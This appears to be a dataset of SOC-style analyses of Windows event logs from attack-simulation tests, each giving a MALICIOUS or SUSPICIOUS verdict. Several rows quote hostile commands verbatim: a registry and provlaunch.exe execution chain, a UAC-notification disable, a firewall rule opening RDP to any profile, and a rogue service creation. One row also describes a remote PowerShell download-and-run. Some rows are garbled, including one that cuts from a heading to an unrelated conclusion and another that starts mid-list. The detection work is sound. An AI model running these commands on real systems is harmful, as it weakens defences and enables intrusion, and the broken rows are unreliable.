**MALICIOUS** - The activity observed in the log files clearly demonstrates a pattern associated with malware deployment or unauthorized actions performed on a critical host (CEO machine).

### Recommendations

1. **Immediate Response**:
   - Isolate the affected machine (Server002) from the network to prevent lateral movement of any potential threats.
   - Run a comprehensive malware scan on the affected system.
   - Review and reset the credentials for the `admin_test` account and any accounts with suspicious logon patterns.
  
2. **Long-Term Measures**:
   - Implement strict PowerShell execution policies and logging to monitor and restrict suspicious usage.
   - Review firewall rules and network configurations to limit access to harmful URLs and prevent unauthorized downloads.
   - Provide user training on suspicious email attachments and phishing techniques which may lead to such malicious executions.
   - Continuously update and enhance endpoint detection and response (EDR) rules to capture and respond to similar activities automatically in the future."
Provlaunch.exe Executes Arbitrary Command via Registry Key,"### Detailed Analysis of Logs

Upon reviewing the provided Windows event logs, the following analysis highlights both benign and potentially suspicious activities:

#### Benign Activities:

1. **Microsoft Edge Update Logs**:
   - There are numerous logs related to Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateSetup_X86.exe`). These entries are consistent with regular software update activities; such activities are typical when system applications update themselves.
   - The processes run under `NT AUTHORITY\SYSTEM`, which would be expected for system-level services, indicating they're likely running with legitimate privileges.
   
2. **Time Synchronization Activities**:
   - Security and System logs reveal time synchronization activities involving `svchost.exe`, which are standard operations conducted by Windows Time Service. Nothing unusual is detected here.

#### Potentially Suspicious Activities:

1. **Process Executions via `cmd.exe`**:
   - Noteworthy is the command line involving `cmd.exe` executing chained commands that manipulate the registry and potentially launch `calc.exe`:
     ```
     ""cmd.exe"" /c reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0 & reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe & c:\windows\system32\provlaunch.exe LOLBin
     ```
   - This sequence appears to exploit known functionalities called ""Living off the Land Binaries"" (LOLBins) for potential malicious use by creating registry entries linked to executable commands. The `provlaunch.exe` isn't typically involved with direct commands such as launching `calc.exe` in standard operations, indicating this might be an attempt at executing unauthorized commands using legitimate executables.

2. **High Integrity Level Execution**:
   - Process executions have been noted running with a high integrity level (`High`), suggesting that they may have had elevated privileges, which can be concerning if unauthorized individuals or malware triggered these actions.

### Assessment of the Situation

The logs point to a combination of regular system updates (benign) and potentially unauthorized command execution indicative of malicious intent. The notable element is the script that interacts with the registry and attempts to execute commands that do not conform to typical system operations.

### Final Conclusion: **SUSPICIOUS**

The identified command execution using `cmd.exe` and registry manipulation is suspicious and warrants further investigation. It does not necessarily confirm a breach, but it raises enough concern to be flagged for detailed analysis, including:

1. **Verify the Legitimate Need**: Confirm with the IT team or the user whether they executed these commands knowingly or if it aligns with approved IT activities or scripts.
2. **Conduct Deeper Forensic Analysis**: Review any associated scripts, scheduled tasks, or external connections existing around the times of these logs to understand the context better.
3. **Isolate and Monitor**: Consider isolating the system temporarily while further detailed analyses are conducted to prevent potential further compromise.

This blend of benign updates mixed with suspicious command execution necessitates categorizing the activity as SUSPICIOUS, implying the need for additional attention to rule out any unauthorized exploitation."
Lolbin Gpscript startup option,"Upon analyzing the provided log entries, here are the observations and findings:

1. **Security Log:**
   - Entries related to event ID 4616 indicate that there are changes to system time. This event typically occurs when a system time change request is made. The specific change observed here is minor (from 21:45:11.4404243 to 21:45:32.4090270), and it appears legitimate as the process involved is ""svchost.exe"", a common Windows system process running under ""LOCAL SERVICE"". No evidence suggests this change is associated with malicious activity directly. 
   
2. **Application Log:**
   - The application events mention the stopping of the ""edgeupdate"" service, which aligns with normal behavior for service operations like updates or restarts.

3. **System Log:**
   - The entries reflect time updates in connection with the Microsoft Windows Time Service and other system-related events. No signs of anomaly or malicious activity are evident.

4. **Sysmon Log:**
   - A series of processes related to Microsoft Edge Update are recorded. Processes like `MicrosoftEdgeUpdate.exe`, `MicrosoftEdgeUpdateComRegisterShell64.exe`, and corresponding temporary files are observed. It appears these entries are associated with Microsoft Edge's regular update system, given the typical paths, and the fact these processes are executed under the `NT AUTHORITY\SYSTEM` with integrity level `System` indicates a high level of trust from the operating system.
   - There are multiple instances where `whoami.exe` and `cmd.exe` are run:
     - `whoami.exe` execution by `admin_test` user is normal for debugging or information-checking purposes.
     - The command `cmd.exe /c Gpscript /startup` shows a script execution at startup, which is not uncommon and could relate to Group Policy scripts but should be verified as it could sometimes mask unwanted script execution.
   - Parent-child relationships in these logs align with expected behavior within the system context observed, particularly with `wsmprovhost.exe` handling tasks related to remote Windows Management.

**Assessment:**
- The log entries mostly represent standard system and application activities such as time adjustments, system updates (specifically for Microsoft Edge), and command executions that are not uncommon and align with expected behavior within corporate IT environments.

**Resolution: SUSPICIOUS**
- Although no definitive indicators of malicious activity are identified, the use of command-line execution for scripts (`cmd.exe /c Gpscript /startup`) requires further examination to ensure these are legitimate and not exploited. 
- Proceed to validate the purpose and integrity of scripts executed during startup, and ensure policies governing such operations are adhered to and are secure against tampering. 
- It is also recommended to review Group Policy scripts and logged activities related to `wevtutil.exe` to ensure no abuse of event log management."
Disable UAC notification via registry keys,"Upon analyzing the provided Windows event logs for the CEO's machine, I have identified certain activities that may be of interest in determining the security status of the machine.

**Analysis of Logs:**

- **System Time Changes:**  
  Multiple events indicate time changes executed by `svchost.exe` under `S-1-5-19` (Local Service). Although time adjustments can be normal system behavior, particularly from an NTP source such as `time.windows.com`, frequent or unexpected modifications could indicate an attempt to manipulate logs or timestamps on the system.

- **Registry Modification:**
  A `cmd.exe` process was run with the command `reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 1 /f` which indicates an attempt to disable User Access Control (UAC) notifications. This is a strong indicator of malicious activity as such actions are often performed to reduce system defenses for executing further unauthorized operations without user prompts.

- **Command-Line Execution:**
  The Sysmon logs captured multiple command-line executions related to system utilities like `whoami.exe`, `HOSTNAME.EXE`, and `wevtutil.exe`. These are within normal parameters but provide context that a user, or potentially a script, is interacting with system diagnostics or configuration.

- **Microsoft Edge Updates:**
  The logs show several `MicrosoftEdgeUpdate.exe` and associated processes running with SYSTEM privileges, which aligns with standard application update behavior, specifically for Microsoft Edge Update services. These activities appear standard for the application update cycle.

**Assessment:**  

The critical focus is on the registry modification event where an attempt to disable UAC notifications was made. This is often used to lower the security boundaries on a system without alerting the user, thereby exposing the possibility of subsequent malicious activities unnoticed. The presence of these activities alongside normal update procedures does not negate the suspicious nature of the registry changes. 

**Resolution:**

- **MALICIOUS** - Given the attempt to modify system settings related to security (disabling UAC notifications), this is considered a clear indicator of malicious intentions. Immediate action should be undertaken to isolate the system, further analyze for persistence mechanisms, and check for unauthorized access or changes. Remediation should include reversing the unauthorized registry changes, confirming system integrity, and strengthening defenses against similar attacks.

**Guidance on Actions:**
1. Isolate the CEO's machine from the network to prevent potential lateral movement.
2. Revert any unauthorized registry modifications and re-enable UAC notifications.
3. Conduct a full system scan with updated antivirus/malware detection tools.
4. Review the installed applications for any unrecognized or unnecessary software and remove them.
5. Inspect and, if necessary, increase monitoring for other systems within the network for similar activities.
6. Educate and remind all users about the potential risks associated with granting excessive access rights.

Maintaining vigilance and a proactive stance will help mitigate further risks and protect the organizational assets."
Indirect Command Execution - conhost.exe,"Upon reviewing the provided Windows event logs, several key observations regarding suspicious and potentially malicious activities were made, particularly on the Sysmon logs. Below is a detailed analysis:

### Analysis of Logs:

1. **Time Synchronization Events:**
   - The Security and Kernel-General logs show multiple timezone updates. These logs suggest minor time adjustments, likely indicating routine time synchronization or timezone changes. These are generally benign activities, which can be dismissed from suspicion in this context.

2. **Process Execution Data:**
   - **Whoami.exe:** Logs indicate that the `whoami.exe` process was executed. This is a benign tool used to display user information. It was run by `admin_test`, which might be part of routine activities for user verification within an administrative session. The use of `whoami.exe` without additional context is typically not suspicious.
   
   - **Conhost.exe and cmd.exe:** Multiple instances of `conhost.exe` being spawned with relationships to other processes like `cmd.exe` and `notepad.exe`. While these are common Windows processes, their combinations can be utilized in command execution chains for malicious purposes. However, without abnormal usage patterns or indications of scripts or malware, this isn't conclusive evidence of malicious intent.
   
   - **Wevtutil.exe:** This process, typically used for event log management, shows several instances being triggered. This could be suspicious if these actions were unauthorized or if there were deletions or modifications of event logs. However, there's no explicit evidence pointing to misuse or anomaly linked with the `admin_test` account.
   
   - **EdgeUpdate.exe:** There are numerous references to `MicrosoftEdgeUpdate.exe`, associated with Microsoft Edge updates. The timestamps and command lines suggest regular auto-update cycles rather than any tampering. The presence of `MicrosoftEdgeUpdate.exe` in locations like the temp directory (`C:\\Program Files (x86)\\Microsoft\\Temp\\`) still aligns with update processes.

3. **Integrity Levels and User Accounts:**
   - All processes are executed with high integrity levels under the `admin_test` account, except those executed by the system account. Usage of `NT AUTHORITY\\SYSTEM` for EdgeUpdate indicates system-level operations.
   
4. **Suspicious Patterns:**
   - The spawning of `cmd.exe` with unusual command lines (`cmd.exe /c conhost.exe ""notepad.exe""`) could potentially be used for testing, debugging, or administrative automation. There aren't additional events that support the abuse of these processes for elevation or evasive maneuvers (e.g., known malware signatures or unexpected outbound connections).

### Assessment and Resolution:

- Based on the detailed review of the logs, there are no definitive indicators of compromise or direct malicious activities. The logs mainly exhibit normal Windows operations, including administrative tasks and automatic system updates which are regular maintenance features on Windows systems.

- However, the `cmd.exe` command calls, particularly those coupled with `conhost.exe`, are slightly atypical and ought to be examined further to rule out misuse, specifically in weather the commands are part of automated scripts or operational tasks authorized by the system administration.

### Final Resolution:

- **Resolution: SUSPICIOUS**

While the processes might be a result of legitimate administrative tasks, the execution patterns, especially involving command lines with `cmd.exe`, suggest further investigation would be prudent. It is recommended to:
1. **Confirm** the legitimacy of these tasks with system administrators.
2. **Audit scheduled tasks or scripts** that may automate these commands.
3. **Investigate the context** and purpose if executing such commands within operational policies to neutralize potential undiscovered threats. 

These actions can help conclude whether these are benign activities or hidden threats requiring mitigation."
Activate Windows NoRun Group Policy Feature,"**Analysis of the Logs:**

Upon thoroughly examining the provided Sysmon, System, Application, and Security logs, the following points have been identified:

1. **Repeated Use of `whoami.exe`:** There are multiple instances where the `whoami.exe` tool is executed. This tool is commonly used to query the currently logged on user account. While not inherently malicious, repeated invocation in a short period could indicate that an attacker is attempting to ascertain user privileges.

2. **Execution of `wevtutil.exe`:** `wevtutil.exe` is a legitimate Windows utility to manage event logs. However, its unexpected usage might suggest log tampering by an attacker to cover their tracks.

3. **Registry Modification via `cmd.exe`:** A potentially concerning behavior was observed with the use of `cmd.exe` to modify the Windows registry:
   - Command: `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v NoRun /t REG_DWORD /d 1 /f`
   - This command disables the ""Run"" command in the Start menu, which could be an indicator of persistence or defense evasion.

4. **Normal Software Update Activity:** Observations of Microsoft Edge updating (`mini_installer.exe` and `setup.exe` executions) appear to be legitimate and match typical system update activities. 

5. **System and Security Logs:**
   - No unusual activity was found; no alteration in system time beyond normal system behaviors.
   - The system logs indicate regular time synchronization and kernel operations.

**Indicators of Suspicious Activity:**

- The registry modification using `cmd.exe` is suspect and should be treated with caution. Such activity could indicate an attempt to limit system functionality for the legitimate user.

**Assessment and Conclusion:**

Based on the analysis of the logs, the most significant concern is the alteration of the system registry to potentially disable functionality by modifying Explorer policies through `cmd.exe`. This activity is consistent with tactics used by malware to hinder user intervention or examination of malicious processes.

**Resolution: SUSPICIOUS**

**Guidance on How to Proceed:**
- Investigate the source and reason for the registry change. Ensure the command's execution was intended by a legitimate user or application.
- Review any additional logs or telemetry to identify the user or process responsible for initiating such changes.
- Consider running a comprehensive malware scan on the system to rule out any hidden threats.

Creating W32Time similar named service using sc,"Upon reviewing the provided logs, several events and their context stand out as potentially suspicious or indicative of malicious activity:

1. **Creation of a Custom Service:**
   - The System log indicates the creation of a service named `win32times` with the command `cmd /c start c:\data.004_NonExistingScript.ps1`. This is highly suspicious for several reasons:
     - The script `c:\data.004_NonExistingScript.ps1` does not appear to exist, indicating possible use of a placeholder or a residual trace of an intended malicious script.
     - Use of `cmd /c` with potentially malicious PowerShell scripts is a known technique for attackers to execute unwanted actions.

2. **High Integrity Level for Processes:**
   - The Sysmon log entries show various command-line operations (`hostname.exe`, `whoami.exe`, `sc.exe`) being executed under a high integrity level by a user `SERVER002\admin_test`. High integrity levels indicate elevated privileges, which could be abused if such processes were not initiated by legitimate administrative activities.

3. **Command-Line Another Potentially Malicious Activity:**
   - The command-line argument captured in the Sysmon events for `cmd.exe` includes the `sc create` command for creating a service, which matches the service creation in the System log. This command execution pattern is common in malicious activity where services are created for persistence.

4. **Unusual Sysmon Activity with wevtutil and conhost:**
   - Multiple processes, such as `wevtutil.exe` and `conhost.exe`, executed in quick succession. Programmatic and repetitive execution of system utilities could point towards script or malware emulation activity.

5. **Credential Activity:**
   - The Security log displays credential-related audit failures with the message indicating ""CountOfCredentialsReturned: 0"". The repeated failures with return code `3221226021` could suggest unsuccessful unauthorized attempts to access or use credentials.

**Assessment:**
- Given the creation of a custom service pointing to a non-existent script, elevated processes initiation under suspicious command lines, associated with system utilities executions, and failed credential-related activities, these logs are indicative of potential malicious activities aimed at persistence or lateral movement within the system.

**Resolution:** MALICIOUS

**Guidance on Proceeding:**
1. **Remediation Actions:**
   - Immediately disable or remove the suspicious service `win32times`.
   - Hunt for any presence of the script `c:\data.004_NonExistingScript.ps1` or variations thereof on the system, and ensure system scanning for any other unauthorized scripts.

2. **Further Investigation:**
   - Conduct a thorough review of recent administrative account activities, especially specific to `admin_test`, to validate legitimacy or denial of actions identified in logs.
   - Implement monitoring to catch any future unauthorized attempts or similar patterns of activities.
   - Perform comprehensive malware scanning using advanced antivirus/endpoint detection solutions.

3. **Preventive Measures:**
   - Strengthen system policies to restrict administrative executions unless predefined or approved, and review service creation policies to enforce stricter controls.
   - Consider network lockdowns of essential services and regular active directory audits to ascertain and verify authentic activities.

4. **User Awareness and Training:**
   - Educate users on recognizing potential security threats linked to unusual script activities and command-line operations."
Open a local port through Windows Firewall to any profile,"Based on the logs provided, let's analyze the data for any indicators of suspicious or malicious activities:

1. **Sysmon Logs:**
   - A PowerShell script was executed which added a firewall rule to open port 3389 (Remote Desktop Protocol) to any connection:  
     ```plaintext
     ""powershell.exe"" & {netsh advfirewall firewall add rule name=""Open Port to Any"" dir=in protocol=tcp localport=3389 action=allow profile=any}
     ```
   - This action is typically associated with attempts to increase remote access to a system which can be considered a security risk if not explicitly authorized.
   - The PowerShell command indicates a high integrity level, which suggests elevated privileges.

2. **Windows PowerShell Logs:**
   - The logs confirm the PowerShell command was executed to open port 3389, corresponding to the recorded Sysmon event.
   - This activity is explicitly documented as running under the `PowerShell.exe` application.

3. **Application and System Logs:**
   - No additional alarming information or anomalies were observed here in contrast to the PowerShell action.

4. **Security Logs:**
   - No unauthorized or unexpected logins detected, nor time-skewing activity beyond the usual synchronization.

**Assessment:**
- The most concerning activity is the PowerShell script execution to open RDP (port 3389) to any incoming connection. This action appears unnecessary and an inappropriate configuration for a system unless it was explicitly required for troubleshooting or administration in a controlled environment.
- Such an action poses a potential security risk which could allow any external unauthorized access to the system, especially if multi-factor authentication and stringent network controls aren't in place.

**Resolution:**
- **MALICIOUS**: Opening RDP widely without clear business justification or security controls is a critical indicator of a potential security threat, often indicative of an environment leading to compromises.
  
**Guidance:**
- Immediately review and revert the firewall rule change if it was unauthorized.
- Conduct a security audit to ensure there are no other vulnerabilities or indicators of compromise.
- Implement additional monitoring and limit RDP access to specific IPs or through VPN access only.
- Educate users and administer training on secure configurations, especially related to administrative actions."
Abusing Windows TelemetryController Registry Key for Persistence,"### Detailed Analysis:

#### Unusual Process Executions:
1. **Wevtutil.exe Usage**:

The indicated registry modification is a strong indicator of a malicious attempt to disable security features, which is often a precursor to further compromise. As such, this activity is concluded to be malicious."
Control Panel Items,"Based on the Windows event logs provided, the following analysis was conducted regarding suspicious activities:

1. **Sysmon Logs Analysis:**
   - There are several entries related to `powershell.exe`, `wevtutil.exe`, `cmd.exe`, `conhost.exe`, and `rundll32.exe`. These executables can be benign, but they are often involved in malicious activities if associated with unusual command-line arguments or unexpected parent-child relationships.
   - Specifically, the command line argument for `cmd.exe` invokes `control.exe` with a `.cpl` file from a temp directory, which is unusual and can be an indicator of malicious activity (possibly DLL side-loading or malware execution).

2. **Process Execution Chain:**
   - The chain of processes starting from `cmd.exe` leading to the execution of `rundll32.exe` with a `.cpl` file located in a temporary directory is suspicious. This behavior is not typical in standard operations and might suggest an attempt to execute a payload via a Control Panel Applet file (CPL), which is a known method for executing malicious code.
   - Additionally, there’s a sequence involving `whoami.exe`, `cmd.exe`, and `calc.exe`. While the `calc.exe` could signify testing or benign use, collectively these combinations in the logs suggest possible unauthorized activities or privilege reconnaissance.

3. **Edge Update Executions:**
   - Multiple instances and various paths for `MicrosoftEdgeUpdate.exe` are noted, suggesting repeated or forced updates. While these may appear legitimate, during a compromised session, adversaries might abuse legitimate services for persistence or lateral movement under the guise of updates.

4. **User Context:**
   - Most suspicious executions occur under the user ""admin_test,"" which could indicate a compromised account, or it could be an administrator performing legitimate tasks. However, given the context and process behavior, further investigation is warranted regarding this account.

**Assessment:**
- The combination of `rundll32.exe` loading a `.cpl` file from a temp directory and the potentially obfuscated PowerShell activity suggests malicious intent or compromised operations on the system.

**Threat/Risk Identified:**
- Potential compromise involving the execution of malicious payloads through `rundll32.exe` and `cmd.exe` with non-standard command lines. This scenario suggests a likelihood of malicious activity, possibly involving malware or unauthorized remote management.

**Guidance on How to Proceed:**
- Immediate containment of the user account ""admin_test"" to prevent further potential unauthorized access.
- Conduct a comprehensive review of all machines that interacted with or from ""Server002"" to determine potential lateral movement.
- Examine the file `calc.cpl` in `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.002\bin\` for malicious code or behavior.
- Review the network flow or endpoint logs for exfiltration methods or external communication associated with these processes.
- Perform a thorough scan of ""Server002"" using updated antivirus/antimalware tools focusing on memory, existing processes, and startup items.

The conclusion of this analysis is a resolution of **MALICIOUS** activity detected within these logs. Immediate response actions are necessary to prevent further damage."
WMI Win32_Product Class - Execute Local MSI file with an embedded EXE,"Based on the analysis of the provided Windows event logs, here's a detailed assessment:

### Analysis:

   - The command `whoami.exe` was executed. It's typically used by attackers to identify the privileges of the compromised session, though it can also be benign.

4. **Execution of Temporary Files**:
   - There is a process `C:\\Windows\\Installer\\MSI9CF4.tmp` executed, which is suspicious given the file naming and directory. It may indicate a potential malicious execution or an anomaly worth additional scrutiny.

5. **Unusual Behavior in Edge Update Processes**:
   - Multiple Edge Update processes observed, including some from temporary directories and entries lacking standard information. Rapid-fire process spawning can indicate automated or scripted actions, potentially suspicious if not matched by official update schedules.

6. **SID and User Details**:
   - The processes are initiated by `SERVER002\\admin_test`, and network service/system accounts. This highlights potential control over privileged user accounts—a common target for attackers.

### Threat Assessment:
- The execution of a PowerShell script installing an MSI from a seemingly random temp directory and the suspicious utilization pattern of system utilities (e.g., `wevtutil`, `whoami`, and execution of unnamed installers) brings a high level of concern regarding system manipulation.
- These behaviors, often associated with malicious activities like installing rogue software or evading detection, suggest possible compromise.

Disable Windows Toast Notifications,"Based on the Windows event logs provided, let's conduct a detailed analysis:

### Analysis:

1. **Time Adjustments:**
    - Several event logs in the ""System"" category feature events related to time changes managed by `svchost.exe`. The time adjustments appear to involve synchronization with `time.windows.com` using the `ntp` protocol.
    - While these time changes are expected in normal operation (e.g., time synchronization), frequent or unscheduled time changes could indicate attempts to obscure activities.

2. **Sysmon Events:**
    - Frequent invocations of `wevtutil.exe` and `conhost.exe` were observed in the Sysmon logs, executed by the `admin_test` user. 
    - `hostname.exe`, `whoami.exe`, `cmd.exe`, and `reg.exe` were also executed, all under the `admin_test` user. The usage of `cmd.exe` to run commands like `reg add` is particularly noteworthy, as it modifies the registry to disable toast notifications, which might be an evasive maneuver.
    - The activity includes `cmd.exe` running commands to alter registry settings, such as `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\PushNotifications`, which alters system notification behavior. This could be an attempt to turn off security alerts or notifications surreptitiously.
    - The rapid sequence of events and command execution suggests automation or scripting rather than manual operation.

3. **Security Levels and Integrity:**
    - High integrity level operations by `admin_test` indicate elevated privileges. Such permissions can be exploited if controlled by a malicious actor.
    - No explicit indications of privilege escalation events or direct evidence of unauthorized access are present in the logs.

4. **Network Service and SYSTEM-Level Processes:**
    - Processes like `sppsvc.exe` and `WmiPrvSE.exe` running under SYSTEM or NETWORK SERVICE accounts indicate typical system functions. There is no direct indication of misuse or compromise from these entries.

5. **No PowerShell or Security Logs:**
    - The absence of PowerShell logs is notable. If this machine regularly operates via PowerShell scripts, their absence could signal log tampering or evasion.
    - Similarly, there are no Security logs provided, which is unusual for a system that experienced an EDR alert.

### Assessment:

Given the provided log entries and the activities observed:

- **SUSPICIOUS**: The activities in the logs, especially the registry modifications using `cmd.exe` and processes executed under high integrity levels by the `admin_test` account, suggest suspicious activity that warrants further investigation.
- Potential risks include a compromised account with elevated privileges (admin_test) executing potentially evasive maneuvers and making unauthorized system changes.

### Recommendations:

1. **Immediate Actions:**
   - Review user activity for the `admin_test` account. Verify any anomalies or irregular access patterns in user behavior or process execution.
   - Conduct a full endpoint investigation, including a scan for malware or scripts that may have triggered these sequences.

2. **Long-Term Actions:**
   - Implement enhanced logging and monitoring, particularly around registry changes and command executions under admin accounts.
   - Consider user education or policy changes to ensure actions like these, if legitimate, are documented and authorized.

This activity suggests a potential threat that requires further attention and evaluation to assess whether there is an ongoing compromise."
Obfuscated Command in PowerShell,"Upon reviewing the provided Windows event logs, a detailed analysis of each log type reveals the following observations:

1. **System and Application Logs:**
   - There are no specific events mentioned that indicate direct signs of malicious activity. The updates and time synchronizations appear normal, reflecting routine system operations.

2. **PowerShell Logs:**
   - The PowerShell log entries show script execution with highly obfuscated command lines, which indicates potential use of a PowerShell-based attack technique. The obfuscation makes it difficult to easily discern the intent of the script without further decoding.
   - This pattern of obfuscation and PowerShell activity is often associated with malicious intent, particularly if run on high-value targets like a CEO's machine.

3. **Security Logs:**
   - Security events show some credential attempts related to `MicrosoftAccount:user=02txoixylodcstop`, but all attempts returned with an error code `3221226021`, indicating failure likely due to invalid credentials or incorrect context for access. This could potentially indicate credential stuffing or other unauthorized access attempts. 

4. **Sysmon Logs:**
   - There are many executions of processes such as `whoami.exe`, `hostname.exe`, `powershell.exe`, and `wevtutil.exe` by the user `SERVER002\admin_test`.
   - While some of these (like `whoami.exe` and `hostname.exe`) are relatively benign under normal conditions, they can form part of a reconnaissance or privilege escalation phase when paired with the obfuscated PowerShell activity.
   - The continuous execution of `wevtutil.exe`, which can be used for reading and clearing event logs, might be an attempt to cover tracks from logging systems if under unauthorized control.

**Assessment of the Situation:**

- The combination of obfuscated PowerShell usage, credential access attempts with failure (possible indication of brute force or unauthorized access attempts), and the execution pattern of system utilities by `admin_test` user raises substantial concerns of suspicious activity.
- Specifically, the activity observed is consistent with potential reconnaissance, defense evasion, and possibly lateral movement stages of a cyber attack targeting a high-profile machine usually involved in higher sensitivity operations, like that of a CEO.

**Resolution: SUSPICIOUS**

- **Guidance on How to Proceed:**
  - **Decode and Analyze PowerShell Scripts**: Carefully decode the obfuscated PowerShell commands to understand their purpose and potential impact fully.
  - **Investigate Credential Attempts**: Review the context of credential access attempts to determine if they were expected operations or part of unauthorized activities. 
  - **Behavioral Analysis**: Conduct behavioral analysis on the actions of the `admin_test` user in this context to determine legitimacy, context, and necessity.
  - **Enhanced Monitoring**: Increase monitoring on this machine and similar high-value targets for additional unusual activities or patterns that may emerge.
  - **Incident Response**: Consider leveraging incident response procedures to ensure containment and remediation before potential compromise is confirmed. This may include isolating the affected machine from the network to prevent further spread or data exfiltration.

In summary, further investigation is warranted to confirm or dispel the potential threat, with a focus on decoded actions and motives underpinning the observed suspicious behavior."
WinPwn - UAC Bypass DccwBypassUAC technique,"### Detailed Log Analysis

Upon examining the provided event logs across different channels, the following activities have been detected:

#### System Log
- The logs show activity related to system time changes, which are captured by Event ID 1 and Event ID 24 of the `Microsoft-Windows-Kernel-General`. These entries indicate that the system time was modified and corrected based on an NTP source (`time.windows.com`). This alone is not suspicious as systems regularly synchronize time with a trusted NTP source.

#### Security Log
- There are `Event ID 4616` entries from `Microsoft-Windows-Security-Auditing`, which reflect the audit of system time changes. Modification of system time can be part of ordinary system operation for time synchronization; however, frequent changes or mismatched timestamps without underlying justification can sometimes indicate an attempt to manipulate logs. The timestamps in these events match those seen in the System Log and do not immediately suggest malicious activity on their own.

#### PowerShell Log
- This log shows several `EventID 600` entries from PowerShell where a script is executed using `Invoke-Expression` (iex) to download and execute a PowerShell script from an external URL (`https://raw.githubusercontent.com/.../dccuac.ps1`). This behavior is highly suspicious and indicative of a potential malicious activity aiming to download and execute files from an external source, which could be part of a compromise or exploit involving credentials or privilege escalation.

#### Sysmon Log
- The Sysmon log includes various process creation events (`Event ID 1`) that highlight the execution of legitimate system utilities (`HOSTNAME.EXE`, `whoami.exe`, `conhost.exe`, `WindowsPowerShell`) by a user account `SERVER002\\admin_test`. While `HOSTNAME` and `whoami` execution alongside PowerShell can be legitimate, given the previously mentioned suspicious PowerShell activity, these could be used to gather system and user information post-compromise.
- Multiple executions of `wevtutil.exe` are noted, which is a legitimate Windows tool often used to export, archive, or clear event logs. If involved in conjunction with a malicious activity, it could be utilized by an attacker to cover tracks by clearing logs.

#### Application Log
- Entries here indicate normal operations related to software protection and Windows Defender being active, which suggests that real-time protection is available and functioning.

### Assessment of the Situation

The examination reveals the use of potentially harmful PowerShell commands attempting to download and execute an external script. This type of behavior aligns with known malicious tactics involving remote code execution and can indicate a compromise if unauthorized or unexpected in the context of normal operations. Other logs such as system time changes or execution of legitimate tools might seem benign individually but can contribute to malicious intent altogether.

### Resolution

**MALICIOUS**: The presence of command involving PowerShell downloading and executing scripts from an external source is a strong indicator of malicious activity. This requires immediate mitigation actions, including:

- Isolate the affected host to prevent further damage or lateral movement.
- Evaluate the impact and scope of any potentially executed scripts.
- Run full antivirus/anti-malware scans to detect and remediate threats.
- Review user activity and permissions, especially for `SERVER002\\admin_test`, to ensure no privilege escalation has occurred.
- Strengthen email and web browsing protections to prevent phishing or drive-by downloads in the future.
- Monitor for any further signs of exploitation or persistence mechanisms."
InstallUtil Install method call,"## Analysis

The provided logs indicate a sequence of activities on a Windows system, specifically focusing on PowerShell script execution, Sysmon events (particularly process creation and termination), and an application log pertaining to Microsoft Edge Update. Below is the analysis of the logs with a focus on suspicious or anomalous behavior:

### PowerShell Log Analysis

1. **PowerShell Script Execution**:
    - A PowerShell script `InstallUtilTestHarness.ps1` is executed from a temporary directory.
    - The script imports a test harness function `Invoke-BuildAndInvokeInstallUtilAssembly`.
    - The script constructs paths and command-line arguments, specifically targeting a `.dll` file (`data.004.dll`) in a temporary folder.
    - The intention seems to be to execute a test harness script for InstallUtil.
    - The use of InstallUtil in this manner can sometimes be leveraged for malicious purposes, particularly because InstallUtil can execute arbitrary code within a DLL during its `install` and `uninstall` phases.

2. **Script Failure Handling**:
    - It attempts to compare actual output with an expected string (`Constructor_Install_`). Any deviations result in a throw error.
    - Error handling is aggressive, indicating that the script is likely part of an automated test or deployment mechanism.

### Sysmon Log Analysis

1. **Process Creation**:
    - Several processes are created in quick succession, notably:
        - **wevtutil.exe** and **conhost.exe** which are generally benign but could be used to query or clear logs.
        - **hostname.exe** and **whoami.exe**, which are being executed possibly to check the system and user context.
        - Multiple instances of **MicrosoftEdgeUpdate.exe** indicating some edge-related update or installation activity.
        - **csc.exe** and **cvtres.exe**, indicating compilation actions typically associated with development or malicious activities where script compilation is part of evasion tactics.
        - **InstallUtil.exe** execution, as mentioned earlier, suggests possible installation activities.
    - **MicrosoftEdgeUpdateComRegisterShell64.exe** is being executed, which might be related to legitimate software update processes.
    - The rapid and repeated execution of processes related to Microsoft Edge Update may indicate a legitimate update, but it’s worth correlating with network activities and update schedules.

2. **Integrity Levels and User Contexts**:
    - Several processes are running at ""High"" integrity levels under ""SERVER002\admin_test"", which indicates a privileged user context.

3. **Suspicious Patterns**:
    - While the activities align with system administration or software installation (e.g., edge updates, script tests), the rapid execution of these processes without visible system logs of associated tasks is anomalous.
    - Use of scripting for deploying DLL and automating InstallUtil execution is common in ""fileless"" malware tactics.

### Application Log Analysis

- A Microsoft Edge update service is stopped as logged in the application channel, corresponding to some of the Sysmon logs about Edge updates.

## Assessment

The analysis reveals activity that is somewhat consistent with either a legitimate software testing/update procedure or a potential misuse of administration privileges for automated DLL deployment and script execution. The context (usage of temporary directories, repeated Edge updates, use of scripting) aligns with potential legitimate administrative tasks but also shares characteristics with certain automation and evasion techniques used by threat actors.

## Resolution

- **Resolution**: **SUSPICIOUS**

### Guidance

1. **Verify Legitimacy**: 
   - Confirm if these activities are sanctioned and if there is any ongoing testing, updating, or deployment in this environment by administrative staff or software management systems.

2. **Investigate Further**:
   - Look into the specifics of `InstallUtilTestHarness.ps1` and `data.004.dll`, tracing any network activities or external communications occurring concurrent with these logs.
   - Review user actions associated with ""admin_test"" to ensure credentials haven't been compromised or misused.

3. **Monitoring**:
   - Ensure endpoint protection mechanisms are observing such behavior for potential lateral movement or expansion of fileless techniques.
   - Set alerts for unusual usage of system utilities like wevtutil, PowerShell with potentially risky scripts, and repeated rapid process execution.

4. **Containment/Remediation** if deemed necessary after further investigation into the context and purpose of these activities."
Scarab Ransomware Defense Evasion Activities,"Upon reviewing the provided event logs, I have identified several key activities and observations that merit a detailed examination.

### Observations:

1. **Security Log:**
